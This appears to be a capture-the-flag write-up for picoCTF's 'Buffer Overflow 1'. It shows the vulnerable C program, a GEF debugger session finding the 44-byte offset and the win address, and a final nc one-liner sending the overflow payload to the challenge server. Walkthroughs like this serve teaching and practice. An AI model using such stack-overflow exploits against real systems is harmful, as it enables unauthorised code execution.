### BUFFER OVERFLOW 1
--- 
Observe vuln.c
```
#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Here can we see that **gets** is a dangerous function will cause buffer overflow. 
There is a simple ret2win technique which help us return to the function prints out flag.
First, we have to determine how many bytes will result in it.
```
gef➤  disas vuln
Dump of assembler code for function vuln:
  ...
   0x0804929a <+25>:    lea    eax,[ebp-0x28]
   0x0804929d <+28>:    push   eax
   0x0804929e <+29>:    call   0x8049050 <gets@plt>
   0x080492a3 <+34>:    add    esp,0x10
  ...
   0x080492c2 <+65>:    leave
   0x080492c3 <+66>:    ret
End of assembler dump.
gef➤  b *0x080492a3
Breakpoint 1 at 0x80492a3
```
![image](https://github.com/user-attachments/assets/ded2baf9-044c-41c0-b86c-5869469f7318)

It is 44 bytes. Now, we have to find **win** address. In GEF, we do it by ``` p <function name> ```

```
gef➤  p & win
$1 = (<text variable, no debug info> *) 0x80491f6 <win>
```


Eventually, send it to server:
```
└─$ (echo -ne "$(python3 -c "import sys; sys.stdout.buffer.write(b'a'*44 + b'\xf6\x91\x04\x08')")"; echo) | nc saturn.picoctf.net 54020
```

